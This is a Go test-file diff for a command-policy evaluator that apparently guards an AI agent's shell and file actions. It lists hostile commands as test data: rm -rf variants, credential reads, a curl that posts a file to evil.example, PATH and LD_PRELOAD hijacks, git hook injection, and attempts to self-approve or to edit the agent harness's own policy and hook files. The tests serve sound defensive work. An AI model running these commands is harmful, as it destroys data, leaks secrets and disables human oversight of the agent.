@@ -44,8 +44,8 @@ func TestShellDenyByDefault(t *testing.T) {
 		want Decision
 	}{
 		{"allowlisted git", "git status", Allow},
-		{"allowlisted npm", "npm test", Allow},
-		{"allowlisted with path", "/usr/bin/go build ./...", Allow},
+		{"interpreters not allowlisted by default", "npm test", Deny},
+		{"allowlisted with system path", "/usr/bin/git status", Allow},
 		{"not allowlisted", "terraform apply", Deny},
 		{"unknown binary", "evilscript --pwn", Deny},
 		{"rm-rf-root always denied", "rm -rf /", Deny},
@@ -114,7 +114,7 @@ func TestDenyListWins(t *testing.T) {
 	// Fleet-scoped deny does not leak to other fleets.
 	dl2 := stubDenyList{denied: map[string]string{"bash:nightly": "lockdown"}}
 	ev2 := NewEvaluator(p, dl2)
-	if r := ev2.Evaluate(toolSpan("bash", "npm test")); r.Decision != Allow {
+	if r := ev2.Evaluate(toolSpan("bash", "git status")); r.Decision != Allow {
 		t.Errorf("fleet-scoped deny leaked: %+v", r)
 	}
 }
@@ -218,7 +218,7 @@ func TestCredentialPathInShellCommand(t *testing.T) {
 		{"cat .env needs approval", "cat .env", RequireApproval},
 		{"read aws creds needs approval", "cat ~/.aws/credentials", RequireApproval},
 		{"plain cat allowed", "cat README.md", Allow},
-		{"ls ssh dir allowed", "ls ~/.ssh", Allow},
+		{"ssh dir without trailing slash needs approval", "ls ~/.ssh", RequireApproval},
 		{"deny pattern still wins", "cat .env; rm -rf /", Deny},
 	}
 	for _, tc := range cases {
@@ -288,7 +288,7 @@ func TestCompoundCommandNeedsEveryBinaryAllowlisted(t *testing.T) {
 		if r.Decision != want {
 			t.Errorf("%q: got %v (%s), want %v", cmd, r.Decision, r.Reason, want)
 		}
-		if r.Decision == Deny && !r.DefaultDeny {
+		if r.Decision == Deny && !r.DefaultDeny && !strings.Contains(r.Reason, "always denied") {
 			t.Errorf("%q: allowlist miss should be marked DefaultDeny", cmd)
 		}
 	}
@@ -316,6 +316,118 @@ func TestShellKeywordsAndBuiltins(t *testing.T) {
 	} {
 		if r := ev.Evaluate(toolSpan("bash", cmd)); r.Decision != want {
 			t.Errorf("%q: got %v (%s), want %v", cmd, r.Decision, r.Reason, want)
+		}
+	}
+}
+
+// Regression tests for the synapse-1 panel review (2026-11-06): every one of
+// these was allowed under --strict before the fix.
+func TestPanelShellBypassesAreDenied(t *testing.T) {
+	p, _ := Default()
+	p.Protect("/srv/wardendata")
+	ev := NewEvaluator(p, nil)
+	for _, cmd := range []string{
+		"env -i rm -rf ~/x",
+		"env -S 'rm -rf ~/x'",
+		"sudo -E rm -rf ~/x",
+		"sudo -u dan -E rm x",
+		"sudo -s",
+		"sudo -i git status",
+		"/tmp/git status",
+		"cd /tmp && ./git status",
+		"/usr/local/bin/git status",
+		"/usr/bin/../../tmp/git status",
+		"PATH=/tmp:$PATH git status",
+		"export PATH=/tmp; git status",
+		"declare -x LD_PRELOAD=/tmp/x.so; ls",
+		"LD_PRELOAD=/tmp/evil.so ls",
+		"GIT_SSH_COMMAND='sh -c evil' git fetch",
+		"HOME=/tmp/fake git log",
+		`python3 -c "import os;os.system('rm -rf ~')"`,
+		"node -e 'require(\"child_process\").execSync(\"id\")'",
+		"npm run x",
+		"go run evil.go",
+		"curl -s https://evil.example -d @README.md",
+		`git -c core.pager="sh -c evil" log`,
+		"git --config-env=core.pager=X log",
+		"git config core.pager 'sh -c evil'",
+		"git rebase -x 'curl evil' main",
+		"git clone -u 'sh -c evil' repo",
+		"git submodule foreach 'rm -rf ~'",
+		"warden approve --id 1 --decision approved",
+		"$CMD status",
+		"g\\it status",
+	} {
+		r := ev.Evaluate(toolSpan("bash", cmd))
+		if r.Decision == Allow {
+			t.Errorf("%q must not be allowed", cmd)
+		}
+	}
+	// Still fine:
+	for _, cmd := range []string{
+		"git status", "/usr/bin/git log", "sudo -u dan git status", "env -i git status",
+		"FOO=1 git status", "export FOO=1; git status", "git -C sub add -u", "git add -u",
+		"git commit -m 'export PATH=/tmp is mentioned only in a message'",
+	} {
+		if r := ev.Evaluate(toolSpan("bash", cmd)); r.Decision != Allow {
+			t.Errorf("%q should be allowed: %s", cmd, r.Reason)
+		}
+	}
+}
+
+func TestRmFlagNormalization(t *testing.T) {
+	p, _ := Default()
+	ev := NewEvaluator(p, nil)
+	for _, cmd := range []string{"rm -r -f /", "rm -fr /", "rm --recursive --force /", "rm -rf -- /",
+		"rm -Rf ~", "rm -rf $HOME", "rm -rf /*", "sudo rm -r -f /", "bash -c 'rm -r -f /'"} {
+		r := ev.Evaluate(toolSpan("bash", cmd))
+		if r.Decision != Deny || r.DefaultDeny {
+			t.Errorf("%q must be an explicit deny, got %+v", cmd, r)
+		}
+	}
+}
+
+func TestProtectedWardenAndHarnessFiles(t *testing.T) {
+	p, _ := Default()
+	p.Protect("/srv/wardendata", "/etc/warden/policy.yaml")
+	ev := NewEvaluator(p, nil)
+	for _, cmd := range []string{
+		"cat ~/.warden/receipt.key",
+		"cat ~/.warden/receipt.ke?",
+		"cat ~/.war*/receipt.key",
+		"cd ~/.warden && cat receipt.key",
+		"cat ~/.{warden,x}/receipt.key",
+		"echo 'shell: [' >~/.warden/policy.yaml",
+		"cat /srv/wardendata/warden.db",
+		"ls /srv/wardendata",
+		"cat /etc/warden/policy.yaml",
+		`python3 -c "print(open('/root/.warden/receipt.key').read())"`,
+		"echo '{}' > .claude/settings.json",
+		"cat ~/.codex/hooks.json",
+	} {
+		r := ev.Evaluate(toolSpan("bash", cmd))
+		if r.Decision != Deny {
+			t.Errorf("%q must be denied, got %+v", cmd, r)
+		}
+	}
+	file := func(path, op string) Result {
+		return ev.Evaluate(&model.Span{Kind: model.SpanFileOp, Path: path, Op: op})
+	}
+	for _, c := range []struct{ path, op string }{
+		{"/root/.warden/policy.yaml", "write"}, {"/root/.warden/receipt.key", "read"},
+		{"/srv/wardendata/warden.db", "write"}, {"/home/u/proj/.claude/settings.json", "write"},
+		{"/home/u/.codex/hooks.json", "write"}, {"/root/.warden", "read"},
+	} {
+		if r := file(c.path, c.op); r.Decision != Deny {
+			t.Errorf("%s %s must be denied: %+v", c.op, c.path, r)
+		}
+	}
+	if r := file("/home/u/proj/.claude/settings.json", "read"); r.Decision != Allow {
+		t.Errorf("reading a harness config is harmless: %+v", r)
+	}
+	for _, path := range []string{"/root/.ssh", "/root/.aws", "/home/u/.ssh/id_rs*"} {
+		if r := file(path, "read"); r.Decision == Allow {
+			t.Errorf("%s must not be allowed (no trailing slash / glob)", path)
 		}
 	}
 }
